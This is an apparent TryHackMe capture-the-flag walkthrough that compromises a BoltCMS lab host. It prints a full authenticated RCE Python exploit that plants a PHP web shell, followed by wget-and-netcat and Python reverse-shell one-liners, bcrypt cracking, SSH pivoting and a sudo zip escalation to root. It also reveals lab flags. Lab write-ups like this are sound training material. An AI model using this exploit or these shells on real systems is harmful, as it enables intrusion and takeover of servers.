---
Learn to exploit the BoltCMS software by researching exploit-db.
---

### Reconnaissance 

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -T4 -A -Pn -sS -n 10.10.238.70
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-09 12:59 EDT
Nmap scan report for 10.10.238.70
Host is up (0.21s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 b1:ac:a9:92:d3:2a:69:91:68:b4:6a:ac:45:43:fb:ed (DSA)
|   2048 3a:3f:9f:59:29:c8:20:d7:3a:c5:04:aa:82:36:68:3f (RSA)
|   256 f9:2f:bb:e3:ab:95:ee:9e:78:7c:91:18:7d:95:84:ab (ECDSA)
|_  256 49:0e:6f:cb:ec:6c:a5:97:67:cc:3c:31:ad:94:a4:54 (ED25519)
80/tcp open  http    nginx 1.6.2
|_http-server-header: nginx/1.6.2
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=10/9%OT=22%CT=1%CU=30142%PV=Y%DS=2%DC=T%G=Y%TM=6342FE2
OS:9%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=2%ISR=109%TI=Z%CI=I%II=I%TS=8)SEQ
OS:(TS=8)SEQ(CI=I%TS=8)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4
OS:=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=6
OS:8DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW7%CC=Y%Q=)ECN(R=
OS:N)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%
OS:W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=
OS:)T5(R=N)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0
OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RI
OS:D=G%RIPCK=G%RUCK=G%RUD=G)U1(R=N)IE(R=Y%DFI=N%T=40%CD=S)IE(R=N)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   201.11 ms 10.11.0.1
2   201.35 ms 10.10.238.70

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.72 seconds
zsh: segmentation fault  sudo nmap -sC -sV -T4 -A -Pn -sS -n 10.10.238.70

```

How many ports are open?
*2*


What ports are open? Comma separated, lowest first: **,**
*22,80*

### Webserver 

Examine webserver. Identify what web-app is running.

What CMS is the website built on?
*Bolt*

### Exploit 

Download exploit for this app. The exploit works, but might not fire every time. If you first don't succeed... https://github.com/jesusgavancho/Boltcms-Auth-rce-py

```
┌──(kali㉿kali)-[~/bolt]
└─$ git clone https://github.com/r3m0t3nu11/Boltcms-Auth-rce-py.git                   
Cloning into 'Boltcms-Auth-rce-py'...
remote: Enumerating objects: 30, done.
remote: Counting objects: 100% (30/30), done.
remote: Compressing objects: 100% (27/27), done.
remote: Total 30 (delta 3), reused 3 (delta 0), pack-reused 0
Receiving objects: 100% (30/30), 8.23 KiB | 936.00 KiB/s, done.
Resolving deltas: 100% (3/3), done.
                                                                                                             
┌──(kali㉿kali)-[~/bolt]
└─$ ls
Boltcms-Auth-rce-py
                                                                                                             
┌──(kali㉿kali)-[~/bolt]
└─$ cd Boltcms-Auth-rce-py 
                                                                                                             
┌──(kali㉿kali)-[~/bolt/Boltcms-Auth-rce-py]
└─$ ls
exploit.py  README.md  requirements.txt
                                                                                                             
┌──(kali㉿kali)-[~/bolt/Boltcms-Auth-rce-py]
└─$ cat exploit.py        
#!/usr/bin/python

import requests
import sys
import warnings
import re
import os
from bs4 import BeautifulSoup
from colorama import init 
from termcolor import colored 
  
init() 
#pip install -r requirements.txt
print(colored('''
 ▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄  ▄       ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄       ▄▄  ▄▄▄▄▄▄▄▄▄▄▄      
▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░▌     ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░▌     ▐░░▌▐░░░░░░░░░░░▌     
▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌      ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░▌░▌   ▐░▐░▌▐░█▀▀▀▀▀▀▀▀▀      
▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌     ▐░▌          ▐░▌▐░▌ ▐░▌▐░▌▐░▌               
▐░█▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌▐░▌          ▐░▌     ▐░▌          ▐░▌ ▐░▐░▌ ▐░▌▐░█▄▄▄▄▄▄▄▄▄      
▐░░░░░░░░░░▌ ▐░▌       ▐░▌▐░▌          ▐░▌     ▐░▌          ▐░▌  ▐░▌  ▐░▌▐░░░░░░░░░░░▌     
▐░█▀▀▀▀▀▀▀█░▌▐░▌       ▐░▌▐░▌          ▐░▌     ▐░▌          ▐░▌   ▀   ▐░▌ ▀▀▀▀▀▀▀▀▀█░▌ 
▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌     ▐░▌          ▐░▌       ▐░▌          ▐░ 
▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░▌     ▐░█▄▄▄▄▄▄▄▄▄ ▐░▌       ▐░▌ ▄▄▄▄▄▄▄▄▄█░▌
▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌     ▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌
 ▀▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀       ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀

Pre Auth rce with low credintanl
#Zero-way By @r3m0t3nu11 speical thanks to @dracula @Mr_Hex''',"blue"))



if len(sys.argv) != 4:
    print((len(sys.argv)))
    print((colored("[~] Usage : ./bolt.py url username password","red")))
    exit()
url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]



request = requests.session()
print((colored("[+] Retrieving CSRF token to submit the login form","green")))
page = request.get(url+"/bolt/login")
html_content = page.text
soup = BeautifulSoup(html_content, 'html.parser')
token = soup.findAll('input')[2].get("value")

login_info = {
    "user_login[username]": username,
    "user_login[password]": password,
    "user_login[login]": "",
     "user_login[_token]": token
   }

login_request = request.post(url+"/bolt/login", login_info)
print((colored("[+] Login token is : {0}","green")).format(token))



aaa = request.get(url+"/bolt/profile")
soup0 = BeautifulSoup(aaa.content, 'html.parser')
token0 = soup0.findAll('input')[6].get("value")
data_profile = { 
        "user_profile[password][first]":"password",
        "user_profile[password][second]":"password",
        "user_profile[email]":"a@a.com",
        "user_profile[displayname]":"<?php system($_GET['test']);?>",
        "user_profile[save]":"",
        "user_profile[_token]":token0

                }
profile = request.post(url+'/bolt/profile',data_profile)




cache_csrf = request.get(url+"/bolt/overview/showcases")

soup1 = BeautifulSoup(cache_csrf.text, 'html.parser')
csrf = soup1.findAll('div')[12].get("data-bolt_csrf_token")


asyncc = request.get(url+"/async/browse/cache/.sessions?multiselect=true")
soup2 = BeautifulSoup(asyncc.text, 'html.parser')
tables = soup2.find_all('span', class_ = 'entry disabled')


print((colored("[+] SESSION INJECTION ","green")))
for all_tables in tables: 

        f= open("session.txt","a+")
        f.write(all_tables.text+"\n")
        f.close()
        num_lines = sum(1 for line in open('session.txt'))

        renamePostData = {
                "namespace": "root",
                "parent": "/app/cache/.sessions",
                "oldname": all_tables.text,
                "newname": "../../../public/files/test{}.php".format(num_lines),
                "token": csrf
           }
        rename = request.post(url+"/async/folder/rename", renamePostData)




        try:
                url1 = url+'/files/test{}.php?test=ls%20-la'.format(num_lines)

                rev = requests.get(url1).text
                r1 = re.findall('php',rev)

                r2 = r1[0]
                if r2 == "php" : 
                        fileINJ = "test{}".format(num_lines)

                        print((colored("[+] FOUND  : "+fileINJ,"green")))

        except IndexError:
                print((colored("[-] Not found.","red")))

new_name = 0
while new_name != 'quit':
        inputs = input(colored("Enter OS command , for exit 'quit' : ","green","on_red"))
        if inputs == "quit" :
                exit()
        else:
                a = requests.get(url+"/files/{}.php?test={}".format(fileINJ,inputs))
                aa = a.text
                r11 = re.findall('...displayname";s:..:"([\w\s\W]+)',aa)


                print((r11)[0])


go to 

┌──(root㉿kali)-[/home/kali/bolt/Boltcms-Auth-rce-py]
└─# echo "10.10.138.76 erit.thm" >> /etc/hosts  

http://erit.thm/bolt

admin:password


```

In the exploit from 2020-04-05, what language is used to write the exploit?
*python*



As the exploit is authenticated, you will also need a username and password. Knowing the URI for the login-portal is also critical for the exploit to work. Find the login-portal and try login in. 
*admin:password*

### Reverse shell 

```
┌──(kali㉿kali)-[~/bolt/Boltcms-Auth-rce-py]
└─$ python3 exploit.py http://erit.thm admin password

 ▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄  ▄       ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄       ▄▄  ▄▄▄▄▄▄▄▄▄▄▄                        
▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░▌     ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░▌     ▐░░▌▐░░░░░░░░░░░▌                       
▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌      ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░▌░▌   ▐░▐░▌▐░█▀▀▀▀▀▀▀▀▀                        
▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌     ▐░▌          ▐░▌▐░▌ ▐░▌▐░▌▐░▌                                 
▐░█▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌▐░▌          ▐░▌     ▐░▌          ▐░▌ ▐░▐░▌ ▐░▌▐░█▄▄▄▄▄▄▄▄▄                        
▐░░░░░░░░░░▌ ▐░▌       ▐░▌▐░▌          ▐░▌     ▐░▌          ▐░▌  ▐░▌  ▐░▌▐░░░░░░░░░░░▌                       
▐░█▀▀▀▀▀▀▀█░▌▐░▌       ▐░▌▐░▌          ▐░▌     ▐░▌          ▐░▌   ▀   ▐░▌ ▀▀▀▀▀▀▀▀▀█░▌                       
▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌     ▐░▌          ▐░▌       ▐░▌          ▐░                        
▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░▌     ▐░█▄▄▄▄▄▄▄▄▄ ▐░▌       ▐░▌ ▄▄▄▄▄▄▄▄▄█░▌                       
▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌     ▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌                       
 ▀▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀       ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀                        
                                                                                                             
Pre Auth rce with low credintanl                                                                             
#Zero-way By @r3m0t3nu11 speical thanks to @dracula @Mr_Hex                                                  
[+] Retrieving CSRF token to submit the login form
[+] Login token is : 6qk4na6wX0ve0NqVXdbeTuKbwE-YPUVnBYYGrQP_sHM
[+] SESSION INJECTION 
[-] Not found.
[-] Not found.
[-] Not found.
[-] Not found.
[+] FOUND  : test5
[-] Not found.
[-] Not found.
[-] Not found.
[-] Not found.
[-] Not found.
[-] Not found.
[-] Not found.
[-] Not found.
[-] Not found.
[+] FOUND  : test15
[-] Not found.
[-] Not found.
[-] Not found.
Enter OS command , for exit 'quit' : id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
";s:8:"*stack";a:0:{}s:10:"*enabled";i:1;s:17:"*shadowpassword";N;s:14:"*shadowtoken";N;s:17:"*shadowvalidity";N;s:15:"*failedlogins";i:0;s:17:"*throttleduntil";N;s:8:"*roles";a:2:{i:0;s:4:"root";i:1;s:8:"everyone";}s:7:"_fields";a:0:{}s:42:"Bolt\Storage\Entity\Entity_specialFields";a:2:{i:0;s:3:"app";i:1;s:6:"values";}s:7:"*_app";N;s:12:"*_internal";a:1:{i:0;s:11:"contenttype";}}s:8:"*token";O:29:"Bolt\Storage\Entity\Authtoken":12:{s:5:"*id";s:1:"3";s:10:"*user_id";i:1;s:8:"*token";s:64:"34e3f69a6fc2261d519381fba1f6b235abc31e4c27f7df4e2559812eaadd53fc";s:7:"*salt";s:32:"d34f9accf4805f6d1eb98f5d698722af";s:11:"*lastseen";O:13:"Carbon\Carbon":3:{s:4:"date";s:26:"2020-04-25 12:32:10.117842";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}s:5:"*ip";s:10:"172.17.0.1";s:12:"*useragent";s:22:"python-requests/2.23.0";s:11:"*validity";O:13:"Carbon\Carbon":3:{s:4:"date";s:26:"2020-05-09 12:32:10.000000";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}s:7:"_fields";a:0:{}s:42:"Bolt\Storage\Entity\Entity_specialFields";a:2:{i:0;s:3:"app";i:1;s:6:"values";}s:7:"*_app";N;s:12:"*_internal";a:1:{i:0;s:11:"contenttype";}}s:10:"*checked";i:1587817930;}s:10:"_csrf/bolt";s:43:"Ji6slP_bySLAwmXIDIFpSa6VSGpYwnW2c-2Ik5nEcy0";s:5:"stack";a:0:{}s:18:"_csrf/user_profile";s:43:"lDGl_6zEExwY5SW63TUC0BS-v9JHoXhm9HeVpfFglDc";}s:12:"_sf2_flashes";a:0:{}s:9:"_sf2_meta";a:3:{s:1:"u";i:1587817932;s:1:"c";i:1587817929;s:1:"l";s:1:"0";}}
Enter OS command , for exit 'quit' : 

```

We can create a simple php-shell on the server, like this:echo '<?php system($_GET["c"]);?>'>c.phpThis we can use to upload a netcat reverse shell on the system and get a reverse shell, as there is no netcat on the box.

If you are using Kali Linux, the netcat installed supports the -e parameter (execute). Using this parameter we can start a shell upon connecting. 

The e parameter is often removed from netcat in a lot of the Linux distributions, because it can be exploited to gain a shell. :-)

First we link the installed netcat to the current directory on our attacking machine:

ln -s $(which nc) .

Then we start a simple web server to serve some files, make sure the files you want to serve are in the current directory:

This will listen on port 8000 on you local machine: python3 -m http.server 8000

Using the c.php file we just dropped, we can browse tohttp://serverip/files/cmd.php?c=wget http://yourip:8000/ncto
download a linux netcat to the server, you will see in your web server if it has been retrieved:

This file is dropped in the same directory as our c.php. We make this nc executable like this: http://serverip/files/cmd.php?c=chmod 755 nc

Now start a netcat listener on your own machine, listening on a free port (we use 4444 here)

ncat -nv -l -p 4444

When it is uploaded and made executable, we can run it like this:
http://serverip/files/cmd.php?c=./nc -e /bin/bash yourip 4444


If all goes well, you will see a connection coming in from the bolt server:
(Don’t forget to do the python pty dance, to make sure you have a shell with PTY’s allocated, some commands, especially sudo, require a PTY shell to run)


python -c 'import pty;pty.spawn("/bin/bash")'



What is the username of the user running the web server?
id

*www-data*

```
Now we have access, we can create a simple PHP shell on the server:


Enter OS command , for exit 'quit' : echo '<?php system($_GET["cmd"]);?>'>cmd.php    
";s:8:"*stack";a:0:{}s:10:"*enabled";i:1;s:17:"*shadowpassword";N;s:14:"*shadowtoken";N;s:17:"*shadowvalidity";N;s:15:"*failedlogins";i:0;s:17:"*throttleduntil";N;s:8:"*roles";a:2:{i:0;s:4:"root";i:1;s:8:"everyone";}s:7:"_fields";a:0:{}s:42:"Bolt\Storage\Entity\Entity_specialFields";a:2:{i:0;s:3:"app";i:1;s:6:"values";}s:7:"*_app";N;s:12:"*_internal";a:1:{i:0;s:11:"contenttype";}}s:8:"*token";O:29:"Bolt\Storage\Entity\Authtoken":12:{s:5:"*id";s:1:"3";s:10:"*user_id";i:1;s:8:"*token";s:64:"34e3f69a6fc2261d519381fba1f6b235abc31e4c27f7df4e2559812eaadd53fc";s:7:"*salt";s:32:"d34f9accf4805f6d1eb98f5d698722af";s:11:"*lastseen";O:13:"Carbon\Carbon":3:{s:4:"date";s:26:"2020-04-25 12:32:10.117842";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}s:5:"*ip";s:10:"172.17.0.1";s:12:"*useragent";s:22:"python-requests/2.23.0";s:11:"*validity";O:13:"Carbon\Carbon":3:{s:4:"date";s:26:"2020-05-09 12:32:10.000000";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}s:7:"_fields";a:0:{}s:42:"Bolt\Storage\Entity\Entity_specialFields";a:2:{i:0;s:3:"app";i:1;s:6:"values";}s:7:"*_app";N;s:12:"*_internal";a:1:{i:0;s:11:"contenttype";}}s:10:"*checked";i:1587817930;}s:10:"_csrf/bolt";s:43:"Ji6slP_bySLAwmXIDIFpSa6VSGpYwnW2c-2Ik5nEcy0";s:5:"stack";a:0:{}s:18:"_csrf/user_profile";s:43:"lDGl_6zEExwY5SW63TUC0BS-v9JHoXhm9HeVpfFglDc";}s:12:"_sf2_flashes";a:0:{}s:9:"_sf2_meta";a:3:{s:1:"u";i:1587817932;s:1:"c";i:1587817929;s:1:"l";s:1:"0";}}

This can then be used to upload a netcat reverse shell (as there is no netcat on the target machine). First, we will need to create a symbolic link to netcat on our local machine to the current directory on the target. Run this command via a local terminal:


┌──(kali㉿kali)-[~/bolt/Boltcms-Auth-rce-py]
└─$ ln -s $(which nc) .
                                                                                                             
┌──(kali㉿kali)-[~/bolt/Boltcms-Auth-rce-py]
└─$ ls                 
exploit.py  ferox-http_10_10_180_232-1665339619.state  nc  README.md  requirements.txt  session.txt

A simple web server can then be started locally in order to serve the file to the target:

┌──(kali㉿kali)-[~/bolt/Boltcms-Auth-rce-py]
└─$ python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...



Using the PHP shell we are able to download netcat to the target via the browser:

http://erit.thm/files/cmd.php?cmd=wget%20http://10.11.81.220/nc

┌──(kali㉿kali)-[~/bolt/Boltcms-Auth-rce-py]
└─$ python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.138.76 - - [09/Oct/2022 14:42:33] "GET /nc HTTP/1.1" 200 -

This file is dropped in the same directory as our c.php. We make this nc executable like this:

http://erit.thm/files/cmd.php?cmd=chmod%20755%20nc

%20 is space

Next we need to start a netcat listener on our local machine

┌──(kali㉿kali)-[~/bolt/Boltcms-Auth-rce-py]
└─$ rlwrap nc -nlvp 4444                                 
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444


Finally, we can trigger this connection via the browser to get our reverse shell:

http://erit.thm/files/cmd.php?cmd=./nc%20-e%20/bin/bash%2010.11.81.220%204444

┌──(kali㉿kali)-[~/bolt/Boltcms-Auth-rce-py]
└─$ rlwrap nc -nlvp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444

not work so using python rev shell

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.81.220",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'


Enter OS command , for exit 'quit' : python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.81.220",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

┌──(kali㉿kali)-[~/bolt/Boltcms-Auth-rce-py]
└─$ rlwrap nc -nlvp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.138.76.
Ncat: Connection from 10.10.138.76:54668.
www-data@Erit:/var/www/html/public/files$ whoami
whoami
www-data

it works!


```

### Priv esc 

In the app/database directory you will find the bolt.db SQLite3 database

file bolt.db
bolt.db: SQLite 3.x database, last written using SQLite version 3020001

Open database:

![](https://i.imgur.com/Fajrmfg.png)

This contains a lot of tables:

![](https://i.imgur.com/fcS9AJM.png)

We list the bolt user database, like this:

![](https://i.imgur.com/WV9wdwV.png)

We see two users, the admin we already own, the other one is a wild one. We also see another IP address, 192.168.100.1 (note to self)

We copy the hash and save it to a file. Then run it through john the ripper, using the infamous "rockyou wordlist

john hash -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt

Using this password, we try to su as the user wileec. This works, and we should find our first flag

```
www-data@Erit:/var/www/html/public/files$ cd ../../app/database
cd ../../app/database
www-data@Erit:/var/www/html/app/database$ ls
ls
bolt.db
www-data@Erit:/var/www/html/app/database$ sqlite3 bolt.db
sqlite3 bolt.db
.tables
bolt_authtoken          bolt_field_value        bolt_pages            
bolt_blocks             bolt_homepage           bolt_relations        
bolt_content_changelog  bolt_log                bolt_showcases        
bolt_cron               bolt_log_change         bolt_taxonomy         
bolt_entries            bolt_log_system         bolt_users            
select * from bolt_users
;
1|admin|$2y$10$id08BrqKsH9TtviCH4Q9q.W6nF38j2RpODkGajLmg77cMCWBNFMYG||0|a@a.com|2022-10-09 18:29:06|192.168.100.1|[]|1|||||["root","everyone"]
2|wildone|$2y$10$ZZqbTKKlgDnCMvGD2M0SxeTS3GPSCljXWtd172lI2zj3p6bjOCGq.|Wile E Coyote|0|wild@one.com|2020-04-25 16:03:44|192.168.100.1|[]|1|||||["editor"]


┌──(kali㉿kali)-[~/bolt/Boltcms-Auth-rce-py]
└─$ echo '$2y$10$ZZqbTKKlgDnCMvGD2M0SxeTS3GPSCljXWtd172lI2zj3p6bjOCGq.' > hash
                                                                                                             
┌──(kali㉿kali)-[~/bolt/Boltcms-Auth-rce-py]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash    
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
snickers         (?)     
1g 0:00:00:06 DONE (2022-10-09 15:01) 0.1547g/s 78.01p/s 78.01c/s 78.01C/s pasaway..claire
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 


doing again but with pty

                                                                                                             
┌──(kali㉿kali)-[~/bolt/Boltcms-Auth-rce-py]
└─$ rlwrap nc -nlvp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.138.76.
Ncat: Connection from 10.10.138.76:54715.
www-data@Erit:/var/www/html/public/files$ python -c 'import pty;pty.spawn("/bin/bash")'
bash")'-c 'import pty;pty.spawn("/bin/b
www-data@Erit:/var/www/html/public/files$ ls
ls
cmd.php                       placeholder_ecff05026ae6.jpg  test25.php
index.html                    test1.php                     test26.php
nc                            test10.php                    test27.php
placeholder_07f6539b3d7d.jpg  test11.php                    test28.php
placeholder_0a23551a8097.jpg  test12.php                    test29.php
placeholder_0aa7e8852e11.jpg  test13.php                    test3.php
placeholder_1fad82e5eac1.jpg  test14.php                    test30.php
placeholder_20001088e915.jpg  test15.php                    test31.php
placeholder_46f89a97453b.jpg  test16.php                    test32.php
placeholder_6a843969b527.jpg  test17.php                    test33.php
placeholder_7c21b25839bd.jpg  test18.php                    test4.php
placeholder_84f5c9d2e2c2.jpg  test19.php                    test5.php
placeholder_8a7754ace050.jpg  test2.php                     test6.php
placeholder_8ec2add549d6.jpg  test20.php                    test7.php
placeholder_9cf46a03a9c3.jpg  test21.php                    test8.php
placeholder_aa536d42187b.jpg  test22.php                    test9.php
placeholder_addfa01cba49.jpg  test23.php
placeholder_c45564b83b31.jpg  test24.php
www-data@Erit:/var/www/html/public/files$ cd /home
cd /home
www-data@Erit:/home$ ls
ls
wileec
www-data@Erit:/home$ su wileec
su wileec
Password: snickers

$ python -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
wileec@Erit:/home$ ls                 ls
ls
wileec
wileec@Erit:/home$ cd wileec          cd wileec
cd wileec
wileec@Erit:~$ ls             ls
ls
flag1.txt
wileec@Erit:~$ cat flag1.txt  cat flag1.txt
cat flag1.txt
THM{Hey!_Welcome_in}

or upgrading another way

$ SHELL=/bin/bash script -q /dev/null
```

What is the users password?
*snickers*


Flag 1
*THM{Hey!_Welcome_in}*

### Pivoting 



User wileec has a ssh private-key!

wileec@Erit:~$ ls -lart .ssh/
-rw-r--r-- 1 wileec wileec  393 Apr 25 15:19 id_rsa.pub
-rw------- 1 wileec wileec 1675 Apr 25 15:19 id_rsa
-rw-r--r-- 1 wileec wileec  222 Apr 25 15:32 known_hosts

Remember the other IP address? We could try to connect to that one, using the SSH key:

ssh wileec@192.168.100.1

Remember: This has to be done from inside of the box, as this network is not available to you from the outside.

We can sudo!
If you look at gtfobins we can see how we could leverage this.

The command is not going to work as it is, you must edit some parts.

```
wileec@Erit:~$ ls -la .ssh    ls -la .ssh
ls -la .ssh
total 20
drwxr-xr-x 2 wileec wileec 4096 Apr 25  2020 .
drwxr-xr-x 4 wileec wileec 4096 Apr 25  2020 ..
-rw------- 1 wileec wileec 1675 Apr 25  2020 id_rsa
-rw-r--r-- 1 wileec wileec  393 Apr 25  2020 id_rsa.pub
-rw-r--r-- 1 wileec wileec  222 Apr 25  2020 known_hosts

Remember the other IP address? We could try to connect to that one, using the SSH key: 

wileec@Erit:~$ ssh wileec@192.ssh wileec@192.168.100.1
ssh wileec@192.168.100.1

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Apr 25 12:36:02 2020 from 192.168.100.100
$ SHELL=/bin/bash script -q /dev/null
SHELL=/bin/bash script -q /dev/null
wileec@Securus:~$ sudo -l           sudo -l
sudo -l
Matching Defaults entries for wileec on Securus:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User wileec may run the following commands on Securus:
    (jsmith) NOPASSWD: /usr/bin/zip

```

User wileec can sudo! What can he sudo? sudo -l
*(jsmith) NOPASSWD: /usr/bin/zip*

### Privesc #2 

Using the sudo-trick, we’re now mr or mrs Smith (and admit, who does not want to be a Mr. or Mrs. Smith once in their life?), as an extra reward, there is flag 2 here.

```
wileec@Securus:~$ TF=$(mktemp -u)   TF=$(mktemp -u)
TF=$(mktemp -u)
wileec@Securus:~$ sudo -u jsmith zipsudo -u jsmith zip $TF /etc/hosts -T -TT 'sh #'
sudo -u jsmith zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 32%)
$ sudo rm $TF
sudo rm $TF
rm: missing operand
Try 'rm --help' for more information.
$ SHELL=/bin/bash script -q /dev/null
SHELL=/bin/bash script -q /dev/null

jsmith@Securus:/home/wileec$ cd ..                        cd ..
cd ..
jsmith@Securus:/home$ ls                    ls
ls
jsmith  wileec
jsmith@Securus:/home$ cd jsmith             cd jsmith
cd jsmith
jsmith@Securus:~$ ls -la            ls -la
ls -la
total 24
drwxrwx--- 2 jsmith jsmith 4096 Apr 25  2020 .
drwxr-xr-x 4 root   root   4096 Apr 26  2020 ..
-rw-r--r-- 1 jsmith jsmith  220 Nov  5  2016 .bash_logout
-rw-r--r-- 1 jsmith jsmith 3515 Nov  5  2016 .bashrc
-rw-r--r-- 1 jsmith jsmith   33 Apr 25  2020 flag2.txt
-rw-r--r-- 1 jsmith jsmith  675 Nov  5  2016 .profile
jsmith@Securus:~$ cat flag2.txt     cat flag2.txt
cat flag2.txt
THM{Welcome_Home_Wile_E_Coyote!}



from gtfobins
$ TF=$(mktemp -u)
$ sudo -u jsmith zip $TF /etc/hosts -T -TT 'sh #'
$ sudo rm $TF
$ SHELL=/bin/bash script -q /dev/null




```

Flag 2
*THM{Welcome_Home_Wile_E_Coyote!}*

### Root 

As jsmith, we again check for sudo rights (this btw, should be your first action on any box when gaining access to a account)

There are several ways to exploit this rights. Go for it!

```
jsmith@Securus:~$ sudo -l           sudo -l
sudo -l
Matching Defaults entries for jsmith on Securus:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jsmith may run the following commands on Securus:
    (ALL : ALL) NOPASSWD: ALL
jsmith@Securus:~$ sudo su           sudo su
sudo su
root@Securus:/home/jsmith# ls -la
ls -la
total 24
drwxrwx--- 2 jsmith jsmith 4096 Apr 25  2020 .
